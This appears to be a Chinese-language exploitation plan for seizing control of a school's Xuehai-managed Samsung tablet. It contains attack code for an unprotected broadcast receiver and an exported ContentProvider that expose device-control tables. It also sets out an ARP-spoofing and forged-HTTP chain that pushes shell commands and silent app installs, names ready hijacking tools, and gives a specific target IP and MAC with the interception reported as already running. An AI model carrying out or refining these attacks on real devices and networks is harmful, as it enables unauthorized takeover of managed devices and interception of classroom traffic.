# 学海学生端平板 —— 完整接管链路（代码级验证版）

> 目标设备：Samsung SM-P200（Android 9，教育平板）
> 分析对象：学海学生端三件套（智通云桌面 / 智通平台 / 云课堂）
> 结论：存在**两条**可执行链路，其中链路 A 为**零日链**，学生可完全自主操控，无需教师账号、无需 root、无需热点。

---

## 0. 结论摘要

| 链路 | 前提 | 可控程度 | 状态 |
|---|---|---|---|
| **A. 零日链（广播 + ContentProvider）** | 在平板装一个普通 APK | 可读写控制数据、触发控制模式、读写模块权限 | ✅ 代码级验证 |
| **B. 网络层伪造（ARP + 明文 HTTP）** | 与平板同局域网 | 伪造登录/assist 会话、下发 executeCmd / 静默安装 | ✅ 工具已就绪，待实机 |
| C. 教师端 APK | 教师账号 | 无（教师端只读任务，任务由服务端产生） | ❌ 不可行 |
| D. Tinker 热修复明文补丁 | App 私钥 | 无（补丁签名强校验 App 自身证书） | ❌ 死路 |

---

## 1. 目标与环境

- 设备：Samsung SM-P200，Android 9
- 网络：课堂 Wi-Fi（示例 `192.168.3.0/24`，平板 `192.168.3.120`，MAC `80:20:fd:8b:4b:fa`）
- 账号：学生端账号（`<ACCOUNT>` / `<PASSWORD>`）
- 应用：
  - `com.xuehai.launcher`（CA106002，智通云桌面 / MDM）
  - `com.xh.zhitongyunstu`（CA106004，智通平台，v3.132.7.20261012S）
  - `com.xh.smartclassstu`（CA104004，云课堂）

---

## 2. 链路 A：零日链（推荐）

### A-1 ControlReceiver 动态注册无权限广播

**代码位置**：`com.xuehai.launcher.control.receiver.ControlReceiver$Companion`

```java
// ControlReceiver$Companion.register(Context) :63-89
IntentFilter filter = new IntentFilter();
filter.addAction("com.xuehai.control.action.app_permission");
filter.addAction("com.xuehai.control.action.all_control");
context.registerReceiver(receiver, filter);   // ← 无 permission 参数
```

**接收逻辑**：

```java
// ControlReceiver.onReceive :74-180
if (!SessionData.isLogin()) return;
switch (action) {
    case "com.xuehai.control.action.app_permission":
        ModelFactory.getAppModel().reqAppModulePermission().subscribe(...);
        break;
    case "com.xuehai.control.action.all_control":
        new ControlRepository().startControlMode();   // ← 启动控制模式
        break;
}
```

**入口闸门**：

```java
// ControlRepository.startControlMode() :7595
if (!CommonControlsManager.INSTANCE.hasPermission()) {
    Log.w("[Lc]::Control", "本地管控权限已关闭！！");
    return;
}

// CommonControlsManager.hasPermission() :379-425
return Permission.checkPermission(0x1000)      // CONTROL
    && SessionData.isStudentLauncher()
    && SessionData.isStudent()
    && SessionData.getUserId() > 0;
```

**关键结论**：`CONTROL (0x1000)` 位在**默认权限位**中：

```java
// Permission.initPermission() :242-340
defaultPermission = addPermission(defaultPermission, 0x4000);  // NOTIFICATION
defaultPermission = addPermission(defaultPermission, 0x1000);  // ★ CONTROL — 默认开启
```

⇒ 已登录学生端设备上 `hasPermission()` 恒为 `true`。

**攻击**：

```java
sendBroadcast(new Intent("com.xuehai.control.action.all_control"));
```

---

### A-2 ContentProvider 无权限读写

**清单声明**：

```xml
<provider android:authorities="com.xh.zhitongyun.provider"
          android:exported="true"
          android:enabled="true"
          android:name="com.xuehai.launcher.component.provider.MyContentProvider"/>
```

**实现**：

```java
// MyContentProvider.query / insert / update / delete
// 只检查 BaseApplication.isCreated()
// 无 checkCallingPermission / getCallingUid / 任何权限校验
```

**DAO 路由**：

```java
// ContentProviderSQLite.initDAOs :159-219
daoMap.put(controlUri,  new ControlDao(db));            // content://.../control
daoMap.put(cacheUri,    new CacheDao(db));              // content://.../cache
daoMap.put(clientUri,   new ClientDao(db));             // content://.../client
daoMap.put(appModulePermissionUri, new AppModulePermissionDao(db));  // content://.../appModelPermission
```

**控制表结构**：

```java
// ControlDao
getTableName() = "control"
列：controlType, controlData, packageName

// 支持的控制类型
SceneControl      → {startAt, endAt, message}          场景控制
LongTimeControl   → {beginTime, endTime}               时长控制
ModuleControl     → {beginTime, endTime}               模块控制
NightControl      → {formatBeginTime, formatEndTime}   夜间控制
```

**攻击**：

```java
ContentResolver cr = getContentResolver();
Uri uri = Uri.parse("content://com.xh.zhitongyun.provider/control");

// 读
Cursor c = cr.query(uri, null,
    "controlType=? AND packageName=?",
    new String[]{"NightControl", "com.xh.smartclassstu"}, null);

// 写
ContentValues cv = new ContentValues();
cv.put("controlType", "NightControl");
cv.put("packageName", "com.xh.smartclassstu");
cv.put("controlData", "{...}");
cr.insert(uri, cv);
```

---

### A-3 组合攻击（完整链路）

```
1. sendBroadcast("com.xuehai.control.action.all_control")
      → ControlReceiver → ControlRepository.startControlMode()
      → hasPermission() = true（默认 CONTROL 位）
      → 进入控制模式

2. content://com.xh.zhitongyun.provider/control  insert/query
      → 读写 场景/时长/模块/夜间 控制数据

3. content://com.xh.zhitongyun.provider/appModelPermission  insert/query
      → 读写应用模块权限

4. content://com.xh.zhitongyun.provider/client / cache
      → 读写客户端缓存数据
```

**前提**：在平板上安装一个普通 APK（学生可通过「设置」/「网络连接」/ADB 自行安装）。

**不需要**：教师账号 / 热点 / ARP / DNS 劫持 / 补丁签名 / root。

---

## 3. 链路 B：网络层伪造（需同局域网）

**前提**：与平板在同一 Wi-Fi 局域网。

```
PC（192.168.3.114）
  → ARP 劫持：把网关 MAC 伪造成 PC（对平板）
  → npcap 明文 HTTP 嗅探器（80 端口）
  → 伪造：
       - 登录响应（伪造 Bearer token / 用户信息）
       - assist 会话 / tasks（executeCmd / installAppOnline）
  → 平板执行：
       - executeCmd → sh（非 root）
       - installAppOnline → Knox 静默安装
```

**已就绪工具**：
- `arp_captive.py`（ARP 劫持，scapy）
- `npcap_http80.py`（明文 HTTP 伪装，已适配 `192.168.3.x`）
- `tls_mitm.py`（443 中间人，需要 CA）

**已知限制**：`executeCmd` 走 `sh` 而非 `su`；`installAppOnline` 需要 Knox Enterprise 激活。

---

## 4. 已排除死路

| # | 方案 | 死因 | 代码证据 |
|---|---|---|---|
| 1 | Tinker 明文 HTTP 补丁 | 补丁签名强校验 App 自身证书 | `ShareSecurityCheck.init` 读取 App 签名 MD5；`check()` 比对证书 |
| 2 | 443 中间人 | SAN 证书校验 | `XHHostnameVerifier` |
| 3 | NetworkLineConfig 改线路 | 编译期关闭 | `BuildConfig.ENV="Production"`，`isDebugMode()`=false |
| 4 | 热点承载 | MT7922 不支持 hosted network | `netsh wlan show drivers` → `Hosted network supported: No` |
| 5 | 教师端 APK | 只读任务，任务由服务端产生 | `AssistModelImpl` 只有 `requestAssist`/`requestAssistTask` |
| 6 | executeCmd 提权 | 走 `sh` 非 `su` | `ZCommand.execCmdForRes` → `Runtime.exec("sh")` |

---

## 5. PoC 计划（链路 A）

**最小 APK 结构**：

```
MainActivity.java
  → sendBroadcast(new Intent("com.xuehai.control.action.all_control"))
  → ContentResolver.query/insert on content://com.xh.zhitongyun.provider/control
  → 显示控制数据
AndroidManifest.xml
  → 单个 Activity，无需任何权限
```

**验证目标**：
1. 广播是否触发控制模式（日志 `ControlReceiver==>ACTION_CONTROL`）
2. control 表是否可读写
3. 控制数据变化是否被 App 消费（场景/夜间模式生效）

---

## 6. 当前状态

- ARP 劫持 + 嗅探器：已启动（需 UAC 提权）
- 平板可达：`192.168.3.120`
- 待验证：链路 A 的 PoC APK 实机效果

---

*文档生成时间：2026-11-07*
*所有结论均基于反编译源码（smali）级验证*
